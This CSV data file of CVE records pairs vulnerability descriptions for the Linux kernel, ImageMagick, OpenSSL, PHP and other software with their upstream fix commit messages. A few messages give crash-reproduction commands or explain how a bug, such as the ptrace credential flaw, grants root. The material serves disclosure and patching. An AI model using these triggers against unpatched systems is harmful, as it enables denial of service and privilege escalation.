CVE-2016-4302,CWE-119,2016-09-21,Heap-based buffer overflow in the parse_codes function in archive_read_support_format_rar.c in libarchive before 3.2.1 allows remote attackers to execute arbitrary code via a RAR file with a zero-sized dictionary.,"A RAR file with an invalid zero dictionary size was not being rejected, leading to a zero-sized allocation for the dictionary storage which was then overwritten during the dictionary initialization.  Thanks to the Open Source and Threat Intelligence project at Cisco for reporting this."
CVE-2014-3478,CWE-119,2014-07-09,"Buffer overflow in the mconvert function in softmagic.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, allows remote attackers to cause a denial of service (application crash) via a crafted Pascal string in a FILE_PSTRING conversion.",Jan Kaluza at RedHat)
CVE-2014-3182,CWE-119,2014-09-28,Array index error in the logi_dj_raw_event function in drivers/hid/hid-logitech-dj.c in the Linux kernel before 3.16.2 allows physically proximate attackers to execute arbitrary code or cause a denial of service (invalid kfree) via a crafted device that provides a malformed REPORT_TYPE_NOTIF_DEVICE_UNPAIRED value.,"device_index is a char type and the size of paired_dj_deivces is 7 elements, therefore proper bounds checking has to be applied to device_index before it is used.  We are currently performing the bounds checking in logi_dj_recv_add_djhid_device(), which is too late, as malicious device could send REPORT_TYPE_NOTIF_DEVICE_UNPAIRED early enough and trigger the problem in one of the report forwarding functions called from logi_dj_raw_event().  Fix this by performing the check at the earliest possible ocasion in logi_dj_raw_event().  Cc: stable@vger.kernel.org Reported-by: Ben Hawkes <hawkes@google.com> Reviewed-by: Benjamin Tissoires <benjamin.tissoires@redhat.com> Signed-off-by: Jiri Kosina <jkosina@suse.cz>"
CVE-2019-11811,CWE-416,2019-05-07,"An issue was discovered in the Linux kernel before 5.0.4. There is a use-after-free upon attempted read access to /proc/ioports after the ipmi_si module is removed, related to drivers/char/ipmi/ipmi_si_intf.c, drivers/char/ipmi/ipmi_si_mem_io.c, and drivers/char/ipmi/ipmi_si_port_io.c.","When we excute the following commands, we got oops rmmod ipmi_si cat /proc/ioports  [ 1623.482380] Unable to handle kernel paging request at virtual address ffff00000901d478 [ 1623.482382] Mem abort info: [ 1623.482383]   ESR = 0x96000007 [ 1623.482385]   Exception class = DABT (current EL), IL = 32 bits [ 1623.482386]   SET = 0, FnV = 0 [ 1623.482387]   EA = 0, S1PTW = 0 [ 1623.482388] Data abort info: [ 1623.482389]   ISV = 0, ISS = 0x00000007 [ 1623.482390]   CM = 0, WnR = 0 [ 1623.482393] swapper pgtable: 4k pages, 48-bit VAs, pgdp = 00000000d7d94a66 [ 1623.482395] [ffff00000901d478] pgd=000000dffbfff003, pud=000000dffbffe003, pmd=0000003f5d06e003, pte=0000000000000000 [ 1623.482399] Internal error: Oops: 96000007 [#1] SMP [ 1623.487407] Modules linked in: ipmi_si(E) nls_utf8 isofs rpcrdma ib_iser ib_srpt target_core_mod ib_srp scsi_transport_srp ib_ipoib rdma_ucm ib_umad rdma_cm ib_cm dm_mirror dm_region_hash dm_log iw_cm dm_mod aes_ce_blk crypto_simd cryptd aes_ce_cipher ses ghash_ce sha2_ce enclosure sha256_arm64 sg sha1_ce hisi_sas_v2_hw hibmc_drm sbsa_gwdt hisi_sas_main ip_tables mlx5_ib ib_uverbs marvell ib_core mlx5_core ixgbe mdio hns_dsaf ipmi_devintf hns_enet_drv ipmi_msghandler hns_mdio [last unloaded: ipmi_si] [ 1623.532410] CPU: 30 PID: 11438 Comm: cat Kdump: loaded Tainted: G            E     5.0.0-rc3+ #168 [ 1623.541498] Hardware name: Huawei TaiShan 2280 /BC11SPCD, BIOS 1.37 11/21/2017 [ 1623.548822] pstate: a0000005 (NzCv daif -PAN -UAO) [ 1623.553684] pc : string+0x28/0x98 [ 1623.557040] lr : vsnprintf+0x368/0x5e8 [ 1623.560837] sp : ffff000013213a80 [ 1623.564191] x29: ffff000013213a80 x28: ffff00001138abb5 [ 1623.569577] x27: ffff000013213c18 x26: ffff805f67d06049 [ 1623.574963] x25: 0000000000000000 x24: ffff00001138abb5 [ 1623.580349] x23: 0000000000000fb7 x22: ffff0000117ed000 [ 1623.585734] x21: ffff000011188fd8 x20: ffff805f67d07000 [ 1623.591119] x19: ffff805f67d06061 x18: ffffffffffffffff [ 1623.596505] x17: 0000000000000200 x16: 0000000000000000 [ 1623.601890] x15: ffff0000117ed748 x14: ffff805f67d07000 [ 1623.607276] x13: ffff805f67d0605e x12: 0000000000000000 [ 1623.612661] x11: 0000000000000000 x10: 0000000000000000 [ 1623.618046] x9 : 0000000000000000 x8 : 000000000000000f [ 1623.623432] x7 : ffff805f67d06061 x6 : fffffffffffffffe [ 1623.628817] x5 : 0000000000000012 x4 : ffff00000901d478 [ 1623.634203] x3 : ffff0a00ffffff04 x2 : ffff805f67d07000 [ 1623.639588] x1 : ffff805f67d07000 x0 : ffffffffffffffff [ 1623.644974] Process cat (pid: 11438, stack limit = 0x000000008d4cbc10) [ 1623.651592] Call trace: [ 1623.654068]  string+0x28/0x98 [ 1623.657071]  vsnprintf+0x368/0x5e8 [ 1623.660517]  seq_vprintf+0x70/0x98 [ 1623.668009]  seq_printf+0x7c/0xa0 [ 1623.675530]  r_show+0xc8/0xf8 [ 1623.682558]  seq_read+0x330/0x440 [ 1623.689877]  proc_reg_read+0x78/0xd0 [ 1623.697346]  __vfs_read+0x60/0x1a0 [ 1623.704564]  vfs_read+0x94/0x150 [ 1623.711339]  ksys_read+0x6c/0xd8 [ 1623.717939]  __arm64_sys_read+0x24/0x30 [ 1623.725077]  el0_svc_common+0x120/0x148 [ 1623.732035]  el0_svc_handler+0x30/0x40 [ 1623.738757]  el0_svc+0x8/0xc [ 1623.744520] Code: d1000406 aa0103e2 54000149 b4000080 (39400085) [ 1623.753441] ---[ end trace f91b6a4937de9835 ]--- [ 1623.760871] Kernel panic - not syncing: Fatal exception [ 1623.768935] SMP: stopping secondary CPUs [ 1623.775718] Kernel Offset: disabled [ 1623.781998] CPU features: 0x002,21006008 [ 1623.788777] Memory Limit: none [ 1623.798329] Starting crashdump kernel... [ 1623.805202] Bye!  If io_setup is called successful in try_smi_init() but try_smi_init() goes out_err before calling ipmi_register_smi(), so ipmi_unregister_smi() will not be called while removing module. It leads to the resource that allocated in io_setup() can not be freed, but the name(DEVICE_NAME) of resource is freed while removing the module. It causes use-after-free when cat /proc/ioports.  Fix this by calling io_cleanup() while try_smi_init() goes to out_err. and don't call io_cleanup() until io_setup() returns successful to avoid warning prints.  Fixes: 93c303d (""ipmi_si: Clean up shutdown a bit"") Cc: stable@vger.kernel.org Reported-by: NuoHan Qiao <qiaonuohan@huawei.com> Suggested-by: Corey Minyard <cminyard@mvista.com> Signed-off-by: Yang Yingliang <yangyingliang@huawei.com> Signed-off-by: Corey Minyard <cminyard@mvista.com>"
CVE-2014-9620,CWE-399,2015-01-21,The ELF parser in file 5.08 through 5.21 allows remote attackers to cause a denial of service via a large number of notes.,  Cherepanov) - Restructure ELF note printing so that we don't print the same message   multiple times on repeated notes of the same kind.
CVE-2016-6198,CWE-284,2016-08-06,"The filesystem layer in the Linux kernel before 4.5.5 proceeds with post-rename operations after an OverlayFS file is renamed to a self-hardlink, which allows local users to cause a denial of service (system crash) via a rename system call, related to fs/namei.c and fs/open.c.","If a file is renamed to a hardlink of itself POSIX specifies that rename(2) should do nothing and return success.  This condition is checked in vfs_rename().  However it won't detect hard links on overlayfs where these are given separate inodes on the overlayfs layer.  Overlayfs itself detects this condition and returns success without doing anything, but then vfs_rename() will proceed as if this was a successful rename (detach_mounts(), d_move()).  The correct thing to do is to detect this condition before even calling into overlayfs.  This patch does this by calling vfs_select_inode() to get the underlying inodes.  Signed-off-by: Miklos Szeredi <mszeredi@redhat.com> Cc: <stable@vger.kernel.org> # v4.2+"
CVE-2018-20217,CWE-617,2018-12-26,"A Reachable Assertion issue was discovered in the KDC in MIT Kerberos 5 (aka krb5) before 1.17. If an attacker can obtain a krbtgt ticket using an older encryption type (single-DES, triple-DES, or RC4), the attacker can crash the KDC by making an S4U2Self request.","For consistency with Windows KDCs, allow protocol transition to work even if the password has expired or needs changing.  Also, when looking up an enterprise principal with an AS request, treat ERR_KEY_EXP as confirmation that the client is present in the realm.  [ghudson@mit.edu: added comment in kdc_process_s4u2self_req(); edited commit message]  ticket: 8763 (new) tags: pullup target_version: 1.17"
CVE-2016-2545,CWE-362,2016-04-27,"The snd_timer_interrupt function in sound/core/timer.c in the Linux kernel before 4.4.1 does not properly maintain a certain linked list, which allows local users to cause a denial of service (race condition and system crash) via a crafted ioctl call.","ALSA timer instance object has a couple of linked lists and they are unlinked unconditionally at snd_timer_stop().  Meanwhile snd_timer_interrupt() unlinks it, but it calls list_del() which leaves the element list itself unchanged.  This ends up with unlinking twice, and it was caught by syzkaller fuzzer.  The fix is to use list_del_init() variant properly there, too.  Reported-by: Dmitry Vyukov <dvyukov@google.com> Tested-by: Dmitry Vyukov <dvyukov@google.com> Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2016-6307,CWE-400,2016-09-26,"The state-machine implementation in OpenSSL 1.1.0 before 1.1.0a allocates memory before checking for an excessive length, which might allow remote attackers to cause a denial of service (memory consumption) via crafted TLS messages, related to statem/statem.c and statem/statem_lib.c.",
CVE-2018-10677,CWE-787,2018-05-02,"The DecodeGifImg function in ngiflib.c in MiniUPnP ngiflib 0.4 lacks certain checks against width and height, which allows remote attackers to cause a denial of service (WritePixels heap-based buffer overflow and application crash) or possibly have unspecified other impact via a crafted GIF file.",fixes #1
CVE-2019-15165,CWE-770,2019-10-03,sf-pcapng.c in libpcap before 1.9.1 does not properly validate the PHB header length before allocating memory.,
CVE-2019-13301,CWE-401,2019-07-05,ImageMagick 7.0.8-50 Q16 has memory leaks in AcquireMagickMemory because of an AnnotateImage error.,
CVE-2016-0705,,2016-03-03,Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key.,
CVE-2016-7480,CWE-119,2017-01-11,"The SplObjectStorage unserialize implementation in ext/spl/spl_observer.c in PHP before 7.0.12 does not verify that a key is an object, which allows remote attackers to execute arbitrary code or cause a denial of service (uninitialized memory access) via crafted serialized data.",
CVE-2014-2669,CWE-189,2014-03-31,"Multiple integer overflows in contrib/hstore/hstore_io.c in PostgreSQL 9.0.x before 9.0.16, 9.1.x before 9.1.12, 9.2.x before 9.2.7, and 9.3.x before 9.3.3 allow remote authenticated users to have unspecified impact via vectors related to the (1) hstore_recv, (2) hstore_from_arrays, and (3) hstore_from_array functions in contrib/hstore/hstore_io.c; and the (4) hstoreArrayToPairs function in contrib/hstore/hstore_op.c, which triggers a buffer overflow.  NOTE: this issue was SPLIT from CVE-2014-0064 because it has a different set of affected versions.","Several functions, mostly type input functions, calculated an allocation size such that the calculation wrapped to a small positive value when arguments implied a sufficiently-large requirement.  Writes past the end of the inadvertent small allocation followed shortly thereafter. Coverity identified the path_in() vulnerability; code inspection led to the rest.  In passing, add check_stack_depth() to prevent stack overflow in related functions.  Back-patch to 8.4 (all supported versions).  The non-comment hstore changes touch code that did not exist in 8.4, so that part stops at 9.0.  Noah Misch and Heikki Linnakangas, reviewed by Tom Lane.  Security: CVE-2014-0064"
CVE-2012-0207,CWE-369,2012-05-17,The igmp_heard_query function in net/ipv4/igmp.c in the Linux kernel before 3.2.1 allows remote attackers to cause a denial of service (divide-by-zero error and panic) via IGMP packets.,"Commit 5b7c840 ('ipv4: correct IGMP behavior on v3 query during v2-compatibility mode') added yet another case for query parsing, which can result in max_delay = 0.  Substitute a value of 1, as in the usual v3 case.  Reported-by: Simon McVittie <smcv@debian.org> References: http://bugs.debian.org/654876 Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-9985,CWE-125,2017-06-28,"The snd_msndmidi_input_read function in sound/isa/msnd/msnd_midi.c in the Linux kernel through 4.11.7 allows local users to cause a denial of service (over-boundary access) or possibly have unspecified other impact by changing the value of a message queue head pointer between two kernel reads of that value, aka a ""double fetch"" vulnerability.","The ISA msnd drivers have loops fetching the ring-buffer head, tail and size values inside the loops.  Such codes are inefficient and fragile.  This patch optimizes it, and also adds the sanity check to avoid the endless loops.  Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=196131 Bugzilla: https://bugzilla.kernel.org/show_bug.cgi?id=196133 Signed-off-by: Takashi Iwai <tiwai@suse.de>"
CVE-2018-11645,CWE-200,2018-06-01,"psi/zfile.c in Artifex Ghostscript before 9.21rc1 permits the status command even if -dSAFER is used, which might allow remote attackers to determine the existence and size of arbitrary files, a similar issue to CVE-2016-7977.",
CVE-2013-0217,CWE-399,2013-02-18,Memory leak in drivers/net/xen-netback/netback.c in the Xen netback functionality in the Linux kernel before 3.7.8 allows guest OS users to cause a denial of service (memory consumption) by triggering certain error conditions.,Signed-off-by: Matthew Daley <mattjd@gmail.com> Reviewed-by: Konrad Rzeszutek Wilk <konrad.wilk@oracle.com> Acked-by: Ian Campbell <ian.campbell@citrix.com> Acked-by: Jan Beulich <JBeulich@suse.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2017-9217,CWE-476,2017-05-24,systemd-resolved through 233 allows remote attackers to cause a denial of service (daemon crash) via a crafted DNS response with an empty question section.,See https://bugs.launchpad.net/ubuntu/+source/systemd/+bug/1621396
CVE-2014-3610,,2014-11-10,"The WRMSR processing functionality in the KVM subsystem in the Linux kernel through 3.17.2 does not properly handle the writing of a non-canonical address to a model-specific register, which allows guest OS users to cause a denial of service (host OS crash) by leveraging guest OS privileges, related to the wrmsr_interception function in arch/x86/kvm/svm.c and the handle_wrmsr function in arch/x86/kvm/vmx.c.","Upon WRMSR, the CPU should inject #GP if a non-canonical value (address) is written to certain MSRs. The behavior is ""almost"" identical for AMD and Intel (ignoring MSRs that are not implemented in either architecture since they would anyhow #GP). However, IA32_SYSENTER_ESP and IA32_SYSENTER_EIP cause #GP if non-canonical address is written on Intel but not on AMD (which ignores the top 32-bits).  Accordingly, this patch injects a #GP on the MSRs which behave identically on Intel and AMD.  To eliminate the differences between the architecutres, the value which is written to IA32_SYSENTER_ESP and IA32_SYSENTER_EIP is turned to canonical value before writing instead of injecting a #GP.  Some references from Intel and AMD manuals:  According to Intel SDM description of WRMSR instruction #GP is expected on WRMSR ""If the source register contains a non-canonical address and ECX specifies one of the following MSRs: IA32_DS_AREA, IA32_FS_BASE, IA32_GS_BASE, IA32_KERNEL_GS_BASE, IA32_LSTAR, IA32_SYSENTER_EIP, IA32_SYSENTER_ESP.""  According to AMD manual instruction manual: LSTAR/CSTAR (SYSCALL): ""The WRMSR instruction loads the target RIP into the LSTAR and CSTAR registers.  If an RIP written by WRMSR is not in canonical form, a general-protection exception (#GP) occurs."" IA32_GS_BASE and IA32_FS_BASE (WRFSBASE/WRGSBASE): ""The address written to the base field must be in canonical form or a #GP fault will occur."" IA32_KERNEL_GS_BASE (SWAPGS): ""The address stored in the KernelGSbase MSR must be in canonical form.""  This patch fixes CVE-2014-3610.  Cc: stable@vger.kernel.org Signed-off-by: Nadav Amit <namit@cs.technion.ac.il> Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>"
CVE-2018-13304,CWE-617,2018-07-05,"In libavcodec in FFmpeg 4.0.1, improper maintenance of the consistency between the context profile field and studio_profile in libavcodec may trigger an assertion failure while converting a crafted AVI file to MPEG4, leading to a denial of service, related to error_resilience.c, h263dec.c, and mpeg4videodec.c.","The profile field is changed by code inside and outside the decoder, its not a reliable indicator of the internal codec state. Maintaining it consistency with studio_profile is messy. Its easier to just avoid it and use only studio_profile  Fixes: assertion failure Fixes: ffmpeg_crash_9.avi  Found-by: Thuan Pham, Marcel Böhme, Andrew Santosa and Alexandru Razvan Caciulescu with AFLSmart Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2019-1010305,CWE-119,2019-07-15,libmspack 0.9.1alpha is affected by: Buffer Overflow. The impact is: Information Disclosure. The component is: function chmd_read_headers() in libmspack(file libmspack/mspack/chmd.c). The attack vector is: the victim must open a specially crafted chm file. The fixed version is: after commit 2f084136cfe0d05e5bf5703f3e83c6d955234b4d.,
CVE-2013-3301,,2013-04-29,"The ftrace implementation in the Linux kernel before 3.8.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact by leveraging the CAP_SYS_ADMIN capability for write access to the (1) set_ftrace_pid or (2) set_graph_function file, and then making an lseek system call.","Currently set_ftrace_pid and set_graph_function files use seq_lseek for their fops.  However seq_open() is called only for FMODE_READ in the fops->open() so that if an user tries to seek one of those file when she open it for writing, it sees NULL seq_file and then panic.  It can be easily reproduced with following command:    $ cd /sys/kernel/debug/tracing   $ echo 1234 | sudo tee -a set_ftrace_pid  In this example, GNU coreutils' tee opens the file with fopen(, ""a"") and then the fopen() internally calls lseek().  Link: http://lkml.kernel.org/r/1365663302-2170-1-git-send-email-namhyung@kernel.org  Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: Ingo Molnar <mingo@kernel.org> Cc: Namhyung Kim <namhyung.kim@lge.com> Cc: stable@vger.kernel.org Signed-off-by: Namhyung Kim <namhyung@kernel.org> Signed-off-by: Steven Rostedt <rostedt@goodmis.org>"
CVE-2017-12666,CWE-772,2017-08-07,ImageMagick 7.0.6-2 has a memory leak vulnerability in WriteINLINEImage in coders/inline.c.,
CVE-2016-6516,CWE-119,2016-08-06,"Race condition in the ioctl_file_dedupe_range function in fs/ioctl.c in the Linux kernel through 4.7 allows local users to cause a denial of service (heap-based buffer overflow) or possibly gain privileges by changing a certain count value, aka a ""double fetch"" vulnerability.","This prevents a double-fetch from user space that can lead to to an undersized allocation and heap overflow.  Fixes: 54dbc15 (""vfs: hoist the btrfs deduplication ioctl to the vfs"") Signed-off-by: Scott Bauer <sbauer@plzdonthack.me> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2019-6976,CWE-908,2019-01-26,libvips before 8.7.4 generates output images from uninitialized memory locations when processing corrupted input image data because iofuncs/memory.c does not zero out allocated memory. This can result in leaking raw process memory contents through the output image.,to prevent write of uninit memory under some error conditions  thanks Balint
CVE-2017-11450,,2017-07-19,coders/jpeg.c in ImageMagick before 7.0.6-1 allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via JPEG data that is too short.,
CVE-2017-14174,CWE-834,2017-09-07,"In coders/psd.c in ImageMagick 7.0.7-0 Q16, a DoS in ReadPSDLayersInternal() due to lack of an EOF (End of File) check might cause huge CPU consumption. When a crafted PSD file, which claims a large ""length"" field in the header but does not contain sufficient backing data, is provided, the loop over ""length"" would consume huge CPU resources, since there is no EOF check inside the loop.",
CVE-2013-3302,CWE-362,2013-04-29,Race condition in the smb_send_rqst function in fs/cifs/transport.c in the Linux kernel before 3.7.2 allows local users to cause a denial of service (NULL pointer dereference and OOPS) or possibly have unspecified other impact via vectors involving a reconnection event.,"Cai reported this oops:  [90701.616664] BUG: unable to handle kernel NULL pointer dereference at 0000000000000028 [90701.625438] IP: [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.632167] PGD fea319067 PUD 103fda4067 PMD 0 [90701.637255] Oops: 0000 [#1] SMP [90701.640878] Modules linked in: des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb iTCO_wdt iTCO_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod [90701.677655] CPU 10 [90701.679808] Pid: 9627, comm: ls Tainted: G        W    3.7.1+ #10 QCI QSSC-S4R/QSSC-S4R [90701.688950] RIP: 0010:[<ffffffff814a343e>]  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.698383] RSP: 0018:ffff88177b431bb8  EFLAGS: 00010206 [90701.704309] RAX: ffff88177b431fd8 RBX: 00007ffffffff000 RCX: ffff88177b431bec [90701.712271] RDX: 0000000000000003 RSI: 0000000000000006 RDI: 0000000000000000 [90701.720223] RBP: ffff88177b431bc8 R08: 0000000000000004 R09: 0000000000000000 [90701.728185] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000001 [90701.736147] R13: ffff88184ef92000 R14: 0000000000000023 R15: ffff88177b431c88 [90701.744109] FS:  00007fd56a1a47c0(0000) GS:ffff88105fc40000(0000) knlGS:0000000000000000 [90701.753137] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [90701.759550] CR2: 0000000000000028 CR3: 000000104f15f000 CR4: 00000000000007e0 [90701.767512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [90701.775465] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [90701.783428] Process ls (pid: 9627, threadinfo ffff88177b430000, task ffff88185ca4cb60) [90701.792261] Stack: [90701.794505]  0000000000000023 ffff88177b431c50 ffff88177b431c38 ffffffffa014fcb1 [90701.802809]  ffff88184ef921bc 0000000000000000 00000001ffffffff ffff88184ef921c0 [90701.811123]  ffff88177b431c08 ffffffff815ca3d9 ffff88177b431c18 ffff880857758000 [90701.819433] Call Trace: [90701.822183]  [<ffffffffa014fcb1>] smb_send_rqst+0x71/0x1f0 [cifs] [90701.828991]  [<ffffffff815ca3d9>] ? schedule+0x29/0x70 [90701.834736]  [<ffffffffa014fe6d>] smb_sendv+0x3d/0x40 [cifs] [90701.841062]  [<ffffffffa014fe96>] smb_send+0x26/0x30 [cifs] [90701.847291]  [<ffffffffa015801f>] send_nt_cancel+0x6f/0xd0 [cifs] [90701.854102]  [<ffffffffa015075e>] SendReceive+0x18e/0x360 [cifs] [90701.860814]  [<ffffffffa0134a78>] CIFSFindFirst+0x1a8/0x3f0 [cifs] [90701.867724]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.875601]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.883477]  [<ffffffffa01578e6>] cifs_query_dir_first+0x26/0x30 [cifs] [90701.890869]  [<ffffffffa015480d>] initiate_cifs_search+0xed/0x250 [cifs] [90701.898354]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.904486]  [<ffffffffa01554cb>] cifs_readdir+0x45b/0x8f0 [cifs] [90701.911288]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.917410]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.923533]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.929657]  [<ffffffff81195848>] vfs_readdir+0xb8/0xe0 [90701.935490]  [<ffffffff81195b9f>] sys_getdents+0x8f/0x110 [90701.941521]  [<ffffffff815d3b99>] system_call_fastpath+0x16/0x1b [90701.948222] Code: 66 90 55 65 48 8b 04 25 f0 c6 00 00 48 89 e5 53 48 83 ec 08 83 fe 01 48 8b 98 48 e0 ff ff 48 c7 80 48 e0 ff ff ff ff ff ff 74 22 <48> 8b 47 28 ff 50 68 65 48 8b 14 25 f0 c6 00 00 48 89 9a 48 e0 [90701.970313] RIP  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.977125]  RSP <ffff88177b431bb8> [90701.981018] CR2: 0000000000000028 [90701.984809] ---[ end trace 24bd602971110a43 ]---  This is likely due to a race vs. a reconnection event.  The current code checks for a NULL socket in smb_send_kvec, but that's too late. By the time that check is done, the socket will already have been passed to kernel_setsockopt. Move the check into smb_send_rqst, so that it's checked earlier.  In truth, this is a bit of a half-assed fix. The -ENOTSOCK error return here looks like it could bubble back up to userspace. The locking rules around the ssocket pointer are really unclear as well. There are cases where the ssocket pointer is changed without holding the srv_mutex, but I'm not clear whether there's a potential race here yet or not.  This code seems like it could benefit from some fundamental re-think of how the socket handling should behave. Until then though, this patch should at least fix the above oops in most cases.  Cc: <stable@vger.kernel.org> # 3.7+ Reported-and-Tested-by: CAI Qian <caiqian@redhat.com> Signed-off-by: Jeff Layton <jlayton@redhat.com> Signed-off-by: Steve French <smfrench@gmail.com>"
CVE-2019-13272,,2019-07-17,"In the Linux kernel before 5.1.17, ptrace_link in kernel/ptrace.c mishandles the recording of the credentials of a process that wants to create a ptrace relationship, which allows local users to obtain root access by leveraging certain scenarios with a parent-child process relationship, where a parent drops privileges and calls execve (potentially allowing control by an attacker). One contributing factor is an object lifetime issue (which can also cause a panic). Another contributing factor is incorrect marking of a ptrace relationship as privileged, which is exploitable through (for example) Polkit's pkexec helper with PTRACE_TRACEME. NOTE: SELinux deny_ptrace might be a usable workaround in some environments.","Fix two issues:  When called for PTRACE_TRACEME, ptrace_link() would obtain an RCU reference to the parent's objective credentials, then give that pointer to get_cred().  However, the object lifetime rules for things like struct cred do not permit unconditionally turning an RCU reference into a stable reference.  PTRACE_TRACEME records the parent's credentials as if the parent was acting as the subject, but that's not the case.  If a malicious unprivileged child uses PTRACE_TRACEME and the parent is privileged, and at a later point, the parent process becomes attacker-controlled (because it drops privileges and calls execve()), the attacker ends up with control over two processes with a privileged ptrace relationship, which can be abused to ptrace a suid binary and obtain root privileges.  Fix both of these by always recording the credentials of the process that is requesting the creation of the ptrace relationship: current_cred() can't change under us, and current is the proper subject for access control.  This change is theoretically userspace-visible, but I am not aware of any code that it will actually break.  Fixes: 64b875f (""ptrace: Capture the ptracer's creds not PT_PTRACE_CAP"") Signed-off-by: Jann Horn <jannh@google.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-5340,CWE-190,2017-01-11,"Zend/zend_hash.c in PHP before 7.0.15 and 7.1.x before 7.1.1 mishandles certain cases that require large array allocations, which allows remote attackers to execute arbitrary code or cause a denial of service (integer overflow, uninitialized memory access, and use of arbitrary destructor function pointers) via crafted serialized data.",
CVE-2017-11714,CWE-125,2017-07-28,"psi/ztoken.c in Artifex Ghostscript 9.21 mishandles references to the scanner state structure, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via a crafted PostScript document, related to an out-of-bounds read in the igc_reloc_struct_ptr function in psi/igc.c.",
CVE-2018-12248,CWE-125,2018-06-12,An issue was discovered in mruby 1.4.1. There is a heap-based buffer over-read associated with OP_ENTER because mrbgems/mruby-fiber/src/fiber.c does not extend the stack in cases of many arguments to fiber.,
CVE-2017-6415,CWE-476,2017-03-02,The dex_parse_debug_item function in libr/bin/p/bin_dex.c in radare2 1.2.1 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted DEX file.,
CVE-2014-9756,CWE-369,2015-11-19,The psf_fwrite function in file_io.c in libsndfile allows attackers to cause a denial of service (divide-by-zero error and application crash) via unspecified vectors related to the headindex variable.,Closes: #92
CVE-2013-4220,,2013-08-25,The bad_mode function in arch/arm64/kernel/traps.c in the Linux kernel before 3.9.5 on the ARM64 platform allows local users to cause a denial of service (system crash) via vectors involving an attempted register access that triggers an unexpected value in the Exception Syndrome Register (ESR).,"Rather than completely killing the kernel if we receive an esr value we can't deal with in the el0 handlers, send the process a SIGILL and log the esr value in the hope that we can debug it. If we receive a bad esr from el1, we'll die() as before.  Signed-off-by: Mark Rutland <mark.rutland@arm.com> Signed-off-by: Catalin Marinas <catalin.marinas@arm.com> Cc: stable@vger.kernel.org"
CVE-2016-10504,CWE-119,2017-08-30,Heap-based buffer overflow vulnerability in the opj_mqc_byteout function in mqc.c in OpenJPEG before 2.2.0 allows remote attackers to cause a denial of service (application crash) via a crafted bmp file.,
CVE-2013-0290,CWE-20,2013-02-19,"The __skb_recv_datagram function in net/core/datagram.c in the Linux kernel before 3.8 does not properly handle the MSG_PEEK flag with zero-length data, which allows local users to cause a denial of service (infinite loop and system hang) via a crafted application.","Tommi was fuzzing with trinity and reported the following problem :  commit 3f518bf (datagram: Add offset argument to __skb_recv_datagram) missed that a raw socket receive queue can contain skbs with no payload.  We can loop in __skb_recv_datagram() with MSG_PEEK mode, because wait_for_packet() is not prepared to skip these skbs.  [   83.541011] INFO: rcu_sched detected stalls on CPUs/tasks: {} (detected by 0, t=26002 jiffies, g=27673, c=27672, q=75) [   83.541011] INFO: Stall ended before state dump start [  108.067010] BUG: soft lockup - CPU#0 stuck for 22s! [trinity-child31:2847] ... [  108.067010] Call Trace: [  108.067010]  [<ffffffff818cc103>] __skb_recv_datagram+0x1a3/0x3b0 [  108.067010]  [<ffffffff818cc33d>] skb_recv_datagram+0x2d/0x30 [  108.067010]  [<ffffffff819ed43d>] rawv6_recvmsg+0xad/0x240 [  108.067010]  [<ffffffff818c4b04>] sock_common_recvmsg+0x34/0x50 [  108.067010]  [<ffffffff818bc8ec>] sock_recvmsg+0xbc/0xf0 [  108.067010]  [<ffffffff818bf31e>] sys_recvfrom+0xde/0x150 [  108.067010]  [<ffffffff81ca4329>] system_call_fastpath+0x16/0x1b  Reported-by: Tommi Rantala <tt.rantala@gmail.com> Tested-by: Tommi Rantala <tt.rantala@gmail.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Cc: Pavel Emelyanov <xemul@parallels.com> Acked-by: Pavel Emelyanov <xemul@parallels.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-10130,CWE-284,2017-03-24,The http_connect function in transports/http.c in libgit2 before 0.24.6 and 0.25.x before 0.25.1 might allow man-in-the-middle attackers to spoof servers by leveraging clobbering of the error variable.,
